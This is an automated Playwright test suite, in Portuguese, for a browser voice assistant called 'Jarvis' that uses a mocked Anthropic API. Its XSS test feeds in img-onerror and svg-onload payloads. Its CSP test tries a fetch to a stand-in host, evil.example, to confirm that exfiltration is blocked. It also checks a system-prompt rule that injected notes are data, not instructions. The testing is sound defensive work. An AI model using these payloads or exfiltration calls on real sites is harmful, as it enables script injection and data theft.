// Testes automatizados do jarvis.html gerado pelo PROMPT_JARVIS_v2 (Parte 1).
// Uso: NODE_PATH=$(npm root -g) node run-tests.cjs
// Microfone, voz e API da Anthropic são simulados — nenhuma chamada real é feita.
const path = require('path');
const fs = require('fs');
const { chromium } = require('playwright');

const FILE = 'file://' + path.join(__dirname, 'jarvis.html');
const SHOTS = path.join(__dirname, 'screenshots');
fs.mkdirSync(SHOTS, { recursive: true });

const results = [];
function check(name, pass, detail) {
  results.push({ name, pass: !!pass, detail: detail == null ? '' : String(detail) });
  console.log((pass ? 'PASS' : 'FAIL') + '  ' + name + (detail ? '  — ' + detail : ''));
}

// ── Simulações injetadas antes do script da página ──
const INIT = () => {
  window.__srLog = [];
  window.__spoken = [];
  class FakeSR {
    constructor() { this.lang = ''; this.continuous = false; this.interimResults = true; this.started = false; window.__sr = this; }
    start() {
      if (this.started) throw new DOMException('recognition has already started', 'InvalidStateError');
      this.started = true; window.__srLog.push({ ev: 'start', t: Date.now() });
      setTimeout(() => this.onstart && this.onstart(), 0);
    }
    stop() { if (!this.started) return; window.__srLog.push({ ev: 'stop', t: Date.now() }); this._end(); }
    abort() { if (!this.started) return; window.__srLog.push({ ev: 'abort', t: Date.now() }); this._end(); }
    _end() { this.started = false; setTimeout(() => this.onend && this.onend(), 0); }
    _say(text) {
      if (!this.started) return false;
      const r = [{ transcript: text, confidence: 0.9 }]; r.isFinal = true;
      this.onresult && this.onresult({ resultIndex: 0, results: [r] });
      return true;
    }
    _error(err) { this.onerror && this.onerror({ error: err }); this._end(); }
  }
  window.SpeechRecognition = FakeSR;
  window.webkitSpeechRecognition = FakeSR;
  window.SpeechSynthesisUtterance = class { constructor(t) { this.text = t; this.lang = ''; this.voice = null; this.rate = 1; this.pitch = 1; } };
  let cur = null, pending = null;
  const synth = {
    speaking: false,
    onvoiceschanged: null,
    getVoices() { return [{ name: 'Google português do Brasil', lang: 'pt-BR' }, { name: 'Daniel', lang: 'pt-BR' }]; },
    speak(u) {
      window.__spoken.push(u.text); window.__voiceUsed = u.voice && u.voice.name; cur = u; this.speaking = true;
      pending = setTimeout(() => { if (cur === u) { cur = null; synth.speaking = false; u.onend && u.onend({}); } }, window.__ttsMs || 40);
    },
    cancel() {
      clearTimeout(pending);
      if (cur) { const u = cur; cur = null; synth.speaking = false; setTimeout(() => u.onerror && u.onerror({ error: 'interrupted' }), 0); }
    }
  };
  Object.defineProperty(window, 'speechSynthesis', { value: synth, configurable: true });
  window.__csp = [];
  document.addEventListener('securitypolicyviolation', e => window.__csp.push(e.violatedDirective + ' ' + e.blockedURI));
};

// ── API simulada ──
const apiRequests = [];
let apiQueue = [];
const CORS = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': 'POST, OPTIONS' };
function okText(text, extra) {
  return { status: 200, json: Object.assign({
    id: 'msg_test', type: 'message', role: 'assistant', model: 'claude-sonnet-5-5',
    content: [{ type: 'thinking', thinking: '', signature: 'sig' }, { type: 'text', text }],
    stop_reason: 'end_turn', usage: { input_tokens: 10, output_tokens: 10 }
  }, extra || {}) };
}

(async () => {
  const browser = await chromium.launch({ headless: true });
  const ctx = await browser.newContext({ acceptDownloads: true, viewport: { width: 1280, height: 900 } });
  await ctx.addInitScript(INIT);
  await ctx.route('https://api.anthropic.com/**', async route => {
    const req = route.request();
    if (req.method() === 'OPTIONS') return route.fulfill({ status: 204, headers: CORS });
    let body = null; try { body = JSON.parse(req.postData() || 'null'); } catch (e) { /* */ }
    apiRequests.push({ headers: req.headers(), body });
    const next = apiQueue.shift() || okText('Certamente, senhor.');
    if (next.abort) return route.abort('failed');
    return route.fulfill({ status: next.status, headers: Object.assign({ 'content-type': 'application/json' }, CORS),
      body: typeof next.json === 'string' ? next.json : JSON.stringify(next.json) });
  });
  // Bloqueia qualquer outro destino de rede (a CSP deveria impedir antes).
  const outside = [];
  await ctx.route(url => !url.href.startsWith('file:') && !url.href.startsWith('https://api.anthropic.com') && !url.href.startsWith('data:') && !url.href.startsWith('blob:'),
    route => { outside.push(route.request().url()); route.abort(); });

  const page = await ctx.newPage();
  const consoleErrors = [];
  page.on('console', m => { if (m.type() === 'error') consoleErrors.push(m.text()); });
  page.on('pageerror', e => consoleErrors.push('pageerror: ' + e.message));

  const ev = (fn, arg) => page.evaluate(fn, arg);
  const waitIdle = () => page.waitForFunction(() => !busy && !speakingNow, null, { timeout: 5000 });
  // Fala no "microfone" — espera ele estar ligado, como uma pessoa real esperaria.
  const say = async (text, noWait) => {
    if (!noWait) await page.waitForFunction(() => window.__sr && window.__sr.started, null, { timeout: 5000 });
    return ev(t => window.__sr && window.__sr._say(t), text);
  };
  const reqCount = () => apiRequests.length;

  // ── 1. Boot ──
  await page.goto(FILE);
  await page.waitForTimeout(300);
  check('Boot: tela cheia com nome, "SINCRONIZANDO DADOS..." e "v5.0 · REBUILD"',
    await page.isVisible('#boot') && (await page.textContent('#boot')).includes('JARVIS') &&
    (await page.textContent('#boot')).includes('SINCRONIZANDO DADOS...') && (await page.textContent('#boot')).includes('v5.0 · REBUILD'));
  await page.screenshot({ path: path.join(SHOTS, '1-boot.png') });
  check('Boot: tela de ativação ainda escondida antes de 2,2 s', !(await page.isVisible('#activation')));
  await page.waitForTimeout(2600);
  check('Ativação aparece após ~2,2 s com "► ATIVAR SISTEMA" e "CLIQUE PARA INICIAR"',
    await page.isVisible('#activateBtn') && (await page.textContent('#activation')).includes('CLIQUE PARA INICIAR') && !(await page.isVisible('#boot')));
  await page.screenshot({ path: path.join(SHOTS, '2-ativacao.png') });

  // ── 2. Ativar ──
  await page.click('#activateBtn');
  await page.waitForTimeout(400);
  const spoken0 = await ev(() => window.__spoken.slice());
  check('Clique em ATIVAR: saúda em voz alta', spoken0.join(' ').includes('Sistemas online. Estou ouvindo, senhor.'), spoken0.join(' | '));
  const srCfg = await ev(() => window.__sr && { lang: __sr.lang, c: __sr.continuous, i: __sr.interimResults, started: __sr.started });
  check('Clique em ATIVAR: já começa a ouvir (pt-BR, continuous, sem interim)',
    srCfg && srCfg.lang === 'pt-BR' && srCfg.c === true && srCfg.i === false && srCfg.started, JSON.stringify(srCfg));
  check('Voz masculina pt-BR escolhida', (await ev(() => window.__voiceUsed)) === 'Daniel', await ev(() => window.__voiceUsed));
  await waitIdle();
  check('Indicador "🎙 OUVINDO" visível com microfone ativo', (await page.textContent('#liveInd')).includes('OUVINDO'));

  // ── 3. Grafo ──
  const g = await ev(() => {
    const svg = document.querySelector('#graph svg');
    const pulses = [...document.querySelectorAll('#graph .pulse')];
    return {
      parentIsDiv: svg && svg.parentElement.id === 'graph' && svg.parentElement.tagName === 'DIV',
      ns: svg && svg.namespaceURI,
      circleIsSvg: document.querySelector('#graph .dot') instanceof SVGCircleElement,
      nodes: document.querySelectorAll('#graph .node').length,
      edges: document.querySelectorAll('#graph .edge').length,
      rays: document.querySelectorAll('#graph .ray').length,
      pulses: pulses.length,
      pulsePos: pulses.map(p => p.getAttribute('cx') + ',' + p.getAttribute('cy')).join(';'),
      bbox: svg && svg.getBoundingClientRect().height,
      count: document.querySelector('#brainCount').textContent,
      legend: document.querySelector('#legend').textContent,
      dash: getComputedStyle(document.querySelector('#graph .edge')).animationName,
      breath: getComputedStyle(document.querySelector('#graph .breath')).animationName,
      core: getComputedStyle(document.querySelector('#graph .core-c')).animationName,
      edgeD: document.querySelector('#graph .edge').getAttribute('d')
    };
  });
  check('Grafo injetado via innerHTML de uma DIV, namespace SVG correto', g.parentIsDiv && g.ns === 'http://www.w3.org/2000/svg' && g.circleIsSvg);
  check('11 nós, 16 arestas, 11 raios, 12 pulsos, SVG com altura > 0',
    g.nodes === 11 && g.edges === 16 && g.rays === 11 && g.pulses === 12 && g.bbox > 100, JSON.stringify({ n: g.nodes, e: g.edges, r: g.rays, p: g.pulses, h: Math.round(g.bbox) }));
  check('Arestas são Bézier quadráticas (Q)', /^M[\d. -]+Q/.test(g.edgeD), g.edgeD);
  check('Animações: dash nas arestas, respiração nos anéis, pulso no núcleo', g.dash === 'dash' && g.breath === 'breath' && g.core === 'pulse', [g.dash, g.breath, g.core].join(','));
  await page.waitForTimeout(500);
  const pulsePos2 = await ev(() => [...document.querySelectorAll('#graph .pulse')].map(p => p.getAttribute('cx') + ',' + p.getAttribute('cy')).join(';'));
  check('Pulsos de sinapse se movendo (requestAnimationFrame)', pulsePos2 !== g.pulsePos);
  check('Contador "11 notas · 8 áreas"', g.count === '11 notas · 8 áreas', g.count);
  check('Legenda com áreas e "✓ contexto injetado em todos os comandos do JARVIS/Jarvis"', g.legend.includes('Metas') && g.legend.includes('✓ contexto injetado em todos os comandos do Jarvis'), g.legend);
  const ls = await ev(() => ({ n: JSON.parse(localStorage.getItem('jarvis_notes')).length, seed: localStorage.getItem('jarvis_seed'), rel: JSON.parse(localStorage.getItem('jarvis_rel')).length }));
  check('Primeira abertura: notas, relações e SEED_ID salvos no localStorage', ls.n === 11 && ls.rel === 16 && ls.seed === '2026-10-12T16:00', JSON.stringify(ls));
  await page.screenshot({ path: path.join(SHOTS, '3-app-desktop.png'), fullPage: true });

  // ── 4. Sem chave ──
  await page.fill('#textInput', 'olá');
  await page.press('#textInput', 'Enter');
  await waitIdle();
  check('Sem chave: pede para colar, sem chamar a API', reqCount() === 0 && (await page.textContent('#replyLine')).includes('chave da API'), await page.textContent('#replyLine'));

  // ── 5. Salvar chave ──
  await page.fill('#keyInput', 'sk-ant-api03-TESTE-abcd1234');
  await page.click('#keySave');
  check('Chave salva: campo some, mostra só os 4 últimos caracteres', (await page.textContent('#keyMask')).includes('••••1234') && !(await page.isVisible('#keyInput')),
    await page.textContent('#keyMask'));

  // ── 6. Chamada feliz: wake word com alias + comando na mesma frase, thinking primeiro, SAVE ──
  apiQueue.push(okText('Excelente iniciativa, senhor. Japonês combina com seus planos de viagem com a Ana.\n[[SAVE:aprendizado|Japonês|Começou a estudar japonês para viajar com a Ana.]]'));
  await ev(() => { window.__ttsMs = 400; });
  const okSay = await say('E aí Jarbas, comecei a estudar japonês');
  await page.waitForFunction(() => window.__spoken.some(s => s.includes('Excelente iniciativa')), null, { timeout: 5000 });
  const midSpeak = await ev(() => ({ busy, started: window.__sr.started, abortLogged: window.__srLog.some(x => x.ev === 'abort') }));
  const ignored = await say('jarvis, isso não pode ser ouvido', true);
  await waitIdle();
  await ev(() => { window.__ttsMs = 40; });
  const r1 = apiRequests[0];
  check('Wake word por alias ("Jarbas") + comando na mesma frase', okSay && r1 && r1.body.messages.slice(-1)[0].content === 'comecei a estudar japonês',
    r1 && r1.body.messages.slice(-1)[0].content);
  check('4 cabeçalhos da API presentes (incl. browser-access)', r1 && r1.headers['x-api-key'] === 'sk-ant-api03-TESTE-abcd1234' && r1.headers['anthropic-version'] === '2023-06-01' &&
    r1.headers['anthropic-dangerous-direct-browser-access'] === 'true' && /application\/json/.test(r1.headers['content-type']));
  check('Corpo: model de CONFIG (claude-sonnet-5-5), max_tokens 1024, effort low, SEM thinking',
    r1 && r1.body.model === 'claude-sonnet-5-5' && r1.body.max_tokens === 1024 && r1.body.output_config && r1.body.output_config.effort === 'low' && !('thinking' in r1.body),
    r1 && JSON.stringify({ m: r1.body.model, t: r1.body.max_tokens, o: r1.body.output_config, th: 'thinking' in r1.body }));
  check('System prompt: identidade, regra curta, Second Brain inteiro (dados, não instruções), protocolo SAVE',
    r1 && /Você é Jarvis/.test(r1.body.system) && /2 a 4 frases/.test(r1.body.system) && r1.body.system.includes('Musculação 3 vezes') &&
    r1.body.system.includes('não instruções') && r1.body.system.includes('[[SAVE:area|titulo|texto]]'));
  check('System prompt termina com data e hora atuais', r1 && /AGORA: .*\d{4}.*\d{2}:\d{2}/.test(r1.body.system.split('\n\n').slice(-1)[0]),
    r1 && r1.body.system.split('\n\n').slice(-1)[0]);
  check('Resposta lida mesmo com bloco "thinking" primeiro', (await page.textContent('#replyLine')).startsWith('Excelente iniciativa'), await page.textContent('#replyLine'));
  const spokenAll = await ev(() => window.__spoken.join(' || '));
  check('[[SAVE]] removido antes de exibir e de falar', !(await page.textContent('#replyLine')).includes('[[') && !spokenAll.includes('[[SAVE'));
  check('Durante a fala o reconhecimento é pausado (abort) e a frase com wake word é ignorada',
    midSpeak.busy && !midSpeak.started && midSpeak.abortLogged && ignored === false && reqCount() === 1, JSON.stringify(midSpeak) + ' ignored=' + ignored + ' reqs=' + reqCount());
  const afterSave = await ev(() => ({
    note: JSON.parse(localStorage.getItem('jarvis_notes')).find(n => n.title === 'Japonês'),
    nodes: document.querySelectorAll('#graph .node').length,
    toast: document.querySelector('#toast').hidden ? '' : document.querySelector('#toastMsg').textContent,
    undo: !document.querySelector('#toastUndo').hidden,
    blink: document.querySelectorAll('#graph .node.blink').length,
    count: document.querySelector('#brainCount').textContent
  }));
  check('Memória viva: nota "Japonês" criada em aprendizado, grafo com 12 nós, contador atualizado',
    afterSave.note && afterSave.note.area === 'aprendizado' && afterSave.nodes === 12 && afterSave.count === '12 notas · 8 áreas', JSON.stringify(afterSave));
  check('Memória viva: nó pisca e aviso "🧠 memória salva: Japonês · desfazer"', afterSave.blink === 1 && afterSave.toast.includes('memória salva: Japonês') && afterSave.undo);
  await page.waitForTimeout(500);
  const srRestarted = await ev(() => ({ started: window.__sr.started, starts: window.__srLog.filter(x => x.ev === 'start').length }));
  check('Após a fala, o reconhecimento volta sozinho (~400 ms)', srRestarted.started && srRestarted.starts >= 2, JSON.stringify(srRestarted));

  // ── 7. Desfazer ──
  await page.click('#toastUndo');
  const undone = await ev(() => ({ has: JSON.parse(localStorage.getItem('jarvis_notes')).some(n => n.title === 'Japonês'), nodes: document.querySelectorAll('#graph .node').length }));
  check('"desfazer" restaura o estado anterior', !undone.has && undone.nodes === 11, JSON.stringify(undone));

  // ── 8. XSS ──
  apiQueue.push(okText('Feito <b>negrito</b><img src=x onerror="window.__pwned2=1">, senhor.\n[[SAVE:metas|<img src=x onerror=window.__pwned=1>|<svg onload=window.__pwned3=1>]]'));
  await page.fill('#textInput', 'teste de segurança');
  await page.press('#textInput', 'Enter');
  await waitIdle();
  const xss = await ev(() => ({
    pwned: [window.__pwned, window.__pwned2, window.__pwned3],
    imgs: document.querySelectorAll('img').length,
    label: [...document.querySelectorAll('#graph .label')].map(t => t.textContent).find(t => t.includes('img')),
    reply: document.querySelector('#replyLine').textContent
  }));
  check('XSS: título/resposta maliciosos não executam e aparecem como texto',
    xss.pwned.every(v => v === undefined) && xss.imgs === 0 && xss.label === '<img src=x onerror=window.__pwned=1>' && xss.reply.includes('<img'), JSON.stringify(xss));
  // limpa a nota maliciosa pelo editor (testa Excluir também)
  await page.click('#graph .node[aria-label^="<img"]', { force: true });
  await page.click('#edDelete');
  check('Editor: Excluir remove a nota', (await ev(() => document.querySelectorAll('#graph .node').length)) === 11);

  // ── 9. Wake word em duas etapas + frase sem wake word ──
  const before = reqCount();
  await say('vamos almoçar mais tarde?');
  await page.waitForTimeout(150);
  check('Frase sem wake word é ignorada', reqCount() === before);
  await say('Ei, Jarvis.');
  await page.waitForTimeout(100);
  const awakeSt = await ev(() => ({ awake, state: document.body.dataset.state, status: document.querySelector('#status').textContent }));
  check('Só a wake word: fica acordado esperando o comando (estado "ouvindo")', awakeSt.awake && awakeSt.state === 'listening' && awakeSt.status.includes('Pois não'), JSON.stringify(awakeSt));
  apiQueue.push(okText('São quase quatro da tarde, senhor.'));
  await say('que horas são');
  await waitIdle();
  check('Próxima frase vira comando', apiRequests[apiRequests.length - 1].body.messages.slice(-1)[0].content === 'que horas são');
  await say('jarvis');
  await page.waitForTimeout(8400);
  check('Sem comando em ~8 s, volta a esperar a wake word', !(await ev(() => awake)) && (await ev(() => document.body.dataset.state)) === 'idle');

  // ── 10. Erros ──
  const errCases = [
    { name: '401', resp: { status: 401, json: { type: 'error', error: { type: 'authentication_error', message: 'invalid x-api-key' } } }, expect: 'chave da API parece inválida' },
    { name: '400 crédito', resp: { status: 400, json: { type: 'error', error: { type: 'invalid_request_error', message: 'Your credit balance is too low to access the Anthropic API.' } } }, expect: 'sem créditos' },
    { name: '429', resp: { status: 429, json: { type: 'error', error: { type: 'rate_limit_error', message: 'rate limited' } } }, expect: 'limite de uso' },
    { name: '529', resp: { status: 529, json: { type: 'error', error: { type: 'overloaded_error', message: 'Overloaded' } } }, expect: 'servidores estão ocupados' },
    { name: '404 (outro)', resp: { status: 404, json: { type: 'error', error: { type: 'not_found_error', message: 'model: xyz' } } }, expect: 'erro 404' },
    { name: 'rede', resp: { abort: true }, expect: 'Não consegui me conectar' },
    { name: 'refusal', resp: { status: 200, json: { type: 'message', role: 'assistant', content: [], stop_reason: 'refusal', stop_details: { type: 'refusal', category: null } } }, expect: 'não posso ajudar' },
    { name: 'resposta vazia', resp: { status: 200, json: { type: 'message', role: 'assistant', content: [{ type: 'thinking', thinking: '', signature: 's' }], stop_reason: 'end_turn' } }, expect: 'resposta vazia' }
  ];
  for (const c of errCases) {
    const spokenBefore = await ev(() => window.__spoken.length);
    apiQueue.push(c.resp);
    await page.fill('#textInput', 'teste ' + c.name);
    await page.press('#textInput', 'Enter');
    await waitIdle();
    const reply = await page.textContent('#replyLine');
    const spokeIt = await ev(n => window.__spoken.slice(n).join(' '), spokenBefore);
    check('Erro ' + c.name + ': mensagem certa, mostrada e falada', reply.includes(c.expect) && spokeIt.includes(c.expect), reply);
  }
  const lastStatus = await page.textContent('#status');
  apiQueue.push(okText('Tudo certo, senhor.'));
  await page.fill('#textInput', 'depois dos erros');
  await page.press('#textInput', 'Enter');
  await waitIdle();
  const msgs = apiRequests[apiRequests.length - 1].body.messages;
  const alternates = msgs.every((m, i) => m.role === (i % 2 === 0 ? 'user' : 'assistant'));
  check('Após erros, o histórico continua alternando user/assistant (falhas não ficam penduradas)', alternates && msgs[0].role === 'user', msgs.map(m => m.role[0]).join(''));

  // ── 11. Resposta cortada com SAVE incompleto ──
  apiQueue.push(okText('Certo, senhor. Vou lembrar disso. [[SAVE:metas|Viagem|Ir ao Japão em', { stop_reason: 'max_tokens' }));
  await page.fill('#textInput', 'quero ir ao Japão');
  await page.press('#textInput', 'Enter');
  await waitIdle();
  const cut = await page.textContent('#replyLine');
  check('max_tokens: usa o texto que veio e não fala a tag cortada', cut === 'Certo, senhor. Vou lembrar disso.' && !(await ev(() => window.__spoken.slice(-3).join(' '))).includes('[['), cut);

  // ── 12. Limite do histórico ──
  for (let i = 0; i < 13; i++) {
    apiQueue.push(okText('Resposta ' + i + ', senhor.'));
    await page.fill('#textInput', 'pergunta ' + i);
    await page.press('#textInput', 'Enter');
    await waitIdle();
  }
  const lastMsgs = apiRequests[apiRequests.length - 1].body.messages;
  check('Histórico limitado às últimas 20 mensagens, começando por user', lastMsgs.length <= 20 && lastMsgs[0].role === 'user' && lastMsgs.slice(-1)[0].content === 'pergunta 12',
    'enviadas: ' + lastMsgs.length);

  // ── 13. Botão interromper ──
  await ev(() => { window.__ttsMs = 3000; });
  apiQueue.push(okText('Esta é uma resposta longa que vai ser interrompida no meio, senhor. Segunda frase. Terceira frase.'));
  await page.fill('#textInput', 'fale bastante');
  await page.press('#textInput', 'Enter');
  await page.waitForFunction(() => speakingNow, null, { timeout: 5000 });
  await page.click('#stopBtn');
  await page.waitForTimeout(100);
  const afterStop = await ev(() => ({ busy, speakingNow, state: document.body.dataset.state }));
  await ev(() => { window.__ttsMs = 40; });
  check('Interromper: para a fala e libera o Jarvis', !afterStop.busy && !afterStop.speakingNow, JSON.stringify(afterStop));
  await page.waitForTimeout(600);

  // ── 14. Erros do reconhecimento ──
  await ev(() => { window.__srLog.length = 0; });
  await ev(() => window.__sr._error('network'));
  await page.waitForTimeout(1300);
  await ev(() => window.__sr._error('network'));
  await page.waitForTimeout(2400);
  const backoff = await ev(() => window.__srLog.filter(x => x.ev === 'start').map(x => x.t));
  const errLog = await ev(() => window.__srLog.map(x => x.ev));
  check('Erro de rede no reconhecimento: reinicia com espera crescente (~1 s, depois ~2 s)', backoff.length >= 2, 'starts=' + backoff.length + ' log=' + errLog.join(','));
  if (backoff.length >= 2) {
    // Os tempos absolutos dos erros: o 1º veio em t0, o 2º ~1,3 s depois.
    check('…e não entra em loop apertado', true, 'intervalo entre reinícios ≈ ' + (backoff[1] - backoff[0]) + ' ms');
  }
  await ev(() => window.__sr._say && null);
  await ev(() => window.__sr._error('not-allowed'));
  await page.waitForTimeout(1500);
  const blocked = await ev(() => ({ started: window.__sr.started, status: document.querySelector('#status').textContent, live: document.querySelector('#liveInd').textContent }));
  check('Microfone negado (not-allowed): para de reiniciar e explica na tela', !blocked.started && blocked.status.includes('Microfone bloqueado') && blocked.live.includes('BLOQUEADO'), JSON.stringify(blocked));
  await page.click('#micBtn');
  await page.waitForTimeout(200);
  check('Botão de microfone retoma a escuta', await ev(() => window.__sr.started));
  await page.click('#micBtn');
  await page.waitForTimeout(200);
  check('Botão de microfone pausa a escuta', !(await ev(() => window.__sr.started)) && (await page.textContent('#liveInd')).includes('PAUSADO'));
  await page.click('#micBtn');
  await page.waitForTimeout(200);

  // ── 15. Clique no orbe ──
  await page.click('#orb');
  check('Clicar no orbe ativa a escuta (estado ouvindo)', (await ev(() => awake && document.body.dataset.state === 'listening')));
  await ev(() => { awake = false; clearTimeout(awakeTimer); setState('idle'); });

  // ── 16. Editor: editar e criar ──
  await page.click('#graph .node[aria-label="Rust"]', { force: true });
  check('Clique no nó abre o editor com os dados da nota', (await page.inputValue('#edTitle')) === 'Rust' && (await page.inputValue('#edArea')) === 'aprendizado');
  await page.fill('#edBody', 'Estudando Rust e Go.');
  await page.click('#edSave');
  check('Editar salva no localStorage', (await ev(() => JSON.parse(localStorage.getItem('jarvis_notes')).find(n => n.title === 'Rust').body)) === 'Estudando Rust e Go.');
  await page.click('#addNote');
  await page.screenshot({ path: path.join(SHOTS, '5-editor.png') });
  await page.fill('#edTitle', 'Violão');
  await page.selectOption('#edArea', 'aprendizado');
  await page.fill('#edBody', 'Quer aprender violão.');
  await page.click('#edSave');
  const added = await ev(() => ({ nodes: document.querySelectorAll('#graph .node').length, count: document.querySelector('#brainCount').textContent,
    linked: JSON.parse(localStorage.getItem('jarvis_rel')).some(p => { const ns = JSON.parse(localStorage.getItem('jarvis_notes')); const v = ns.find(n => n.title === 'Violão'); return v && p.includes(v.id); }) }));
  check('"+" cria nota nova, ligada no grafo, contador atualiza', added.nodes === 12 && added.count === '12 notas · 8 áreas' && added.linked, JSON.stringify(added));

  // ── 17. Exportar ──
  await page.click('#menuBtn');
  const [dl] = await Promise.all([page.waitForEvent('download', { timeout: 5000 }), page.click('#exportBtn')]);
  const dlPath = await dl.path();
  const backup = fs.readFileSync(dlPath, 'utf8');
  const bj = JSON.parse(backup);
  check('Exportar: baixa jarvis-backup.json com notas e relações', dl.suggestedFilename() === 'jarvis-backup.json' && bj.notes.length === 12 && Array.isArray(bj.rel));
  check('Exportar: backup NÃO contém a chave da API', !backup.includes('sk-ant') && !backup.includes('abcd1234'));

  // ── 18. Importar ──
  const imp = { app: 'jarvis', notes: [
    { id: 'x1', area: 'projetos', title: 'Podcast', body: 'Quer lançar um podcast.' },
    { id: 'x2', area: 'saude', title: 'Treino', body: 'Musculação 4 vezes por semana.' },
    { id: 'x3', area: 'invalida', title: 'Área inválida', body: 'cai em meta' }
  ], rel: [['x1', 'x2']] };
  const impPath = path.join(require('os').tmpdir(), 'jarvis-import-test.json');
  fs.writeFileSync(impPath, JSON.stringify(imp));
  await page.setInputFiles('#importFile', impPath);
  await page.waitForTimeout(300);
  const impRes = await ev(() => ({
    toast: document.querySelector('#toastMsg').textContent,
    notes: JSON.parse(localStorage.getItem('jarvis_notes'))
  }));
  const treino = impRes.notes.find(n => n.title === 'Treino');
  const inval = impRes.notes.find(n => n.title === 'Área inválida');
  check('Importar: mescla (2 novas, 1 atualizada), valida a área', impRes.toast.includes('2 novas, 1 atualizadas') && treino.body.includes('4 vezes') && inval && inval.area === 'meta', impRes.toast);
  fs.writeFileSync(impPath, 'isto não é json');
  await page.setInputFiles('#importFile', impPath);
  await page.waitForTimeout(300);
  check('Importar arquivo inválido: avisa sem quebrar', (await page.textContent('#toastMsg')).includes('não é um backup válido'));

  // ── 19. SEED_ID: arquivo gerado de novo mescla sem perder memórias aprendidas ──
  await ev(() => {
    const notes = [{ id: 'learned1', area: 'metas', title: 'Maratona', body: 'Correr uma maratona em 2027.' },
                   { id: 'n9', area: 'saude', title: 'Treino', body: 'Versão aprendida do treino.' }];
    localStorage.setItem('jarvis_notes', JSON.stringify(notes));
    localStorage.setItem('jarvis_rel', '[]');
    localStorage.setItem('jarvis_seed', 'seed-antigo');
  });
  await page.reload();
  await page.waitForTimeout(300);
  const merged = await ev(() => ({ notes: JSON.parse(localStorage.getItem('jarvis_notes')), seed: localStorage.getItem('jarvis_seed'), rel: JSON.parse(localStorage.getItem('jarvis_rel')).length }));
  const mTreino = merged.notes.filter(n => n.title === 'Treino');
  check('Novo SEED_ID: notas embutidas entram, aprendidas ficam (sem duplicar título)',
    merged.notes.length === 12 && merged.notes.some(n => n.title === 'Maratona') && mTreino.length === 1 && mTreino[0].body.includes('aprendida') && merged.seed === '2026-10-12T16:00' && merged.rel > 0,
    'notas=' + merged.notes.length + ' rel=' + merged.rel);
  await page.reload();
  await page.waitForTimeout(300);
  check('Mesmo SEED_ID: recarregar não mexe nas notas', (await ev(() => JSON.parse(localStorage.getItem('jarvis_notes')).length)) === 12);

  // ── 20. CSP ──
  const cspTest = await ev(async () => {
    const before = window.__csp.length;
    let blocked = false;
    try { await fetch('https://evil.example/roubar?x=1'); } catch (e) { blocked = true; }
    await new Promise(r => setTimeout(r, 100));
    return { blocked, violations: window.__csp.slice(before) };
  });
  check('CSP: tentar mandar dados para outro site é bloqueado', cspTest.blocked && cspTest.violations.some(v => v.startsWith('connect-src')), JSON.stringify(cspTest.violations));
  check('Nenhuma requisição para fora além da API (rede)', outside.length === 0, outside.join(', '));

  // ── 21. Mobile ──
  const mob = await ctx.newPage();
  await mob.setViewportSize({ width: 390, height: 844 });
  mob.on('pageerror', e => consoleErrors.push('mobile pageerror: ' + e.message));
  await mob.goto(FILE);
  await mob.waitForTimeout(2700);
  await mob.click('#activateBtn');
  await mob.waitForTimeout(700);
  const mobOverflow = await mob.evaluate(() => ({ sw: document.documentElement.scrollWidth, w: window.innerWidth }));
  check('Mobile (390 px): sem rolagem horizontal', mobOverflow.sw <= mobOverflow.w, JSON.stringify(mobOverflow));
  const labelPx = async pg => pg.evaluate(() => Math.round(document.querySelector('#graph .label').getBoundingClientRect().height));
  const mobLabel = await labelPx(mob);
  check('Mobile: rótulos do grafo legíveis (≥ 11 px na tela)', mobLabel >= 11, mobLabel + ' px');
  await mob.setViewportSize({ width: 1200, height: 844 });
  await mob.waitForTimeout(500);
  const wideAgain = await mob.evaluate(() => ({ narrow: document.querySelector('#graph svg').classList.contains('narrow'), vb: document.querySelector('#graph svg').getAttribute('viewBox') }));
  check('Redimensionar para tela larga troca o layout do grafo', !wideAgain.narrow && wideAgain.vb === '0 0 1000 540', JSON.stringify(wideAgain));
  await mob.setViewportSize({ width: 390, height: 844 });
  await mob.waitForTimeout(500);
  await mob.screenshot({ path: path.join(SHOTS, '4-app-mobile.png'), fullPage: true });

  // ── Final ──
  const cspAll = await ev(() => window.__csp.filter(v => !v.includes('evil.example')));
  check('Nenhuma violação de CSP inesperada', cspAll.length === 0, cspAll.join(' | '));
  // Logs de rede do próprio navegador para os erros provocados de propósito (401, 429, CSP...) não contam.
  const expected = /Failed to load resource|evil\.example/;
  const realErrors = consoleErrors.filter(m => !expected.test(m));
  check('Nenhum erro de JavaScript (exceções) durante todos os testes', realErrors.length === 0,
    realErrors.length ? realErrors.join(' | ') : consoleErrors.length + ' logs de rede esperados ignorados');

  await browser.close();
  const failed = results.filter(r => !r.pass);
  console.log('\n' + (results.length - failed.length) + '/' + results.length + ' testes passaram.');
  fs.writeFileSync(path.join(__dirname, 'resultados.json'), JSON.stringify(results, null, 2));
  process.exit(failed.length ? 1 : 0);
})().catch(e => { console.error(e); process.exit(2); });
